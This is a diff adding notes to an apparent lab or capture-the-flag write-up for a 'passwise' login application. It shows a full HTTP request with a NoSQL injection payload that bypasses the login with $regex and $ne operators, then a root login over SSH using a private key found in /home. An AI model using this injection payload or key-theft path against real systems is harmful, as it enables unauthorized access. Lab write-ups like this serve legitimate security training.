@@ -20,3 +20,38 @@ login
 Login
 font
 #+end_src
+
+This lab is vulnerable to NoSQLinjection, is possible to bypass the login page with this payload ->
+#+begin_src sh
+POST /login HTTP/1.1
+Host: passwise.valkyriedigital.hv
+Content-Length: 54
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://passwise.valkyriedigital.hv
+Referer: http://passwise.valkyriedigital.hv/login
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+{"email":{"$regex":"admin.*"},"password":{"$ne":null}}
+#+end_src
+
+With the regex on the email field, is possible to get the email which starts with admin*
+
+* exploit
+
+After bypass the login page, get the SSH Server password, to access the server and response the awnsers
+
+To get root use the root ssh file in the /home directory ->
+#+begin_src sh
+sherpa@debian:/home$ ls
+root_id_rsa  root_id_rsa.pub  sherpa
+sherpa@debian:/home$
+#+end_src
+
+Connect as root ->
+#+begin_src sh
+ssh -i root_id_rsa root@172.20.12.115
+#+end_src
